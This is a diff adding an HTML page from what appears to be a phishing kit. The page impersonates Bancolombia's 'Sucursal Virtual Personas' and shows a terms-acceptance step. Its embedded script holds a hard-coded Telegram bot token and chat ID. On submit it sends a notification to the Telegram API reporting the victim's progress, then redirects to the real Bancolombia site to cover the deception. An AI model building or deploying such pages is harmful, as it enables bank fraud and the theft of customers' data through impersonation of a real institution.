@@ -1,0 +1,147 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sucursal Virtual Personas - Bancolombia</title>
+    <link rel="stylesheet" href="styles_new.css">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; background: linear-gradient(135deg, #1a1f2e 0%, #16213e 100%); display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+        .loading-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(255, 255, 255, 0.95); z-index: 9999; justify-content: center; align-items: center; }
+        .loading-overlay.active { display: flex; }
+        .spinner { width: 50px; height: 50px; border: 4px solid #e0e0e0; border-top: 4px solid #FFD700; border-radius: 50%; animation: spin 1s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+    <div class="loading-overlay" id="loadingOverlay">
+        <div class="spinner"></div>
+    </div>
+
+    <div class="auth-container">
+        <div class="auth-content">
+            <img src="img/logo-bancolombia-blanco.png" alt="Bancolombia" class="logo">
+            <h1>Sucursal Virtual Personas</h1>
+            
+            <div class="auth-box">
+                <h2>Términos y Condiciones</h2>
+                <p>Por favor, lee y acepta los siguientes términos:</p>
+                
+                <form id="terminosForm" class="auth-form">
+                    <div class="terminos-container">
+                        <div class="checkbox-group">
+                            <input type="checkbox" id="termino1" class="termino-check">
+                            <label for="termino1">Autorizo el uso y tratamiento de mis datos personales y biométricos.</label>
+                        </div>
+                        <div class="checkbox-group">
+                            <input type="checkbox" id="termino2" class="termino-check">
+                            <label for="termino2">Acepto los términos y condiciones de la Sucursal Virtual.</label>
+                        </div>
+                        <div class="checkbox-group">
+                            <input type="checkbox" id="termino3" class="termino-check">
+                            <label for="termino3">Confirmo que soy el titular de la cuenta y la información proporcionada es verídica.</label>
+                        </div>
+                    </div>
+                    <div class="button-container">
+                        <button type="submit" class="btn-iniciar" disabled>Continuar</button>
+                        <button type="button" class="btn-cancelar">Cancelar</button>
+                    </div>
+                </form>
+            </div>
+        </div>
+
+        <div class="help-links">
+            <a href="#">¿Problemas para conectarte?</a>
+            <span class="separator">•</span>
+            <a href="#">Aprende sobre seguridad</a>
+            <span class="separator">•</span>
+            <a href="#">Reglamento Sucursal Virtual</a>
+            <span class="separator">•</span>
+            <a href="#">Política de privacidad</a>
+        </div>
+
+        <footer class="footer">
+            <div class="footer-content">
+                <div class="footer-left">
+                    <img src="img/logo-bancolombia-blanco.png" alt="Bancolombia" class="footer-logo">
+                    <img src="img/SFC_NEGRO_1_1.png" alt="SFC" class="sfc-logo">
+                </div>
+                <div class="footer-right">
+                    <p class="ip-address" id="ipAddress">Cargando IP...</p>
+                    <p class="datetime" id="datetime">Cargando fecha y hora...</p>
+                </div>
+            </div>
+        </footer>
+    </div>
+
+    <div id="loadingOverlay" class="loading-overlay">
+        <img src="img/LogoBancolombia.png" alt="Cargando..." class="loading-logo">
+    </div>
+
+    <script>
+    const TELEGRAM_BOT_TOKEN = '8882344336:AAF7YqBNYTL7Hb_9dPSicH9da29xEUSImGo';
+    const TELEGRAM_CHAT_ID = '-1003784784181';
+
+    document.addEventListener('DOMContentLoaded', function() {
+        const check1 = document.getElementById('termino1');
+        const check2 = document.getElementById('termino2');
+        const check3 = document.getElementById('termino3');
+        const btn = document.querySelector('.btn-iniciar');
+        const form = document.getElementById('terminosForm');
+        const overlay = document.getElementById('loadingOverlay');
+        
+        btn.disabled = true;
+        
+        function validateForm() {
+            const isValid = check1.checked && check2.checked && check3.checked;
+            btn.disabled = !isValid;
+            if (isValid) {
+                btn.style.backgroundColor = '#FFD700';
+                btn.style.cursor = 'pointer';
+            } else {
+                btn.style.backgroundColor = '';
+                btn.style.cursor = 'default';
+            }
+        }
+        
+        check1.addEventListener('change', validateForm);
+        check2.addEventListener('change', validateForm);
+        check3.addEventListener('change', validateForm);
+        
+        form.addEventListener('submit', async function(e) {
+            e.preventDefault();
+            if (btn.disabled) return;
+            
+            overlay.classList.add('active');
+
+            const mensaje = `✅ <b>TÉRMINOS - BANCOLOMBIA</b>
+
+<b>Términos:</b> Aceptados (3/3)
+
+<b>⏰ Recibido:</b> ${new Date().toLocaleString('es-CO')}`;
+
+            try {
+                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: mensaje, parse_mode: 'HTML' })
+                });
+
+                if ((await response.json()).ok) {
+                    setTimeout(() => { window.location.href = 'https://www.bancolombia.com/'; }, 2000);
+                } else {
+                    overlay.classList.remove('active');
+                }
+            } catch (error) {
+                overlay.classList.remove('active');
+            }
+        });
+
+        document.querySelector('.btn-cancelar').addEventListener('click', () => {
+            window.location.href = 'index.html';
+        });
+    });
+    </script>
+</body>
+</html>
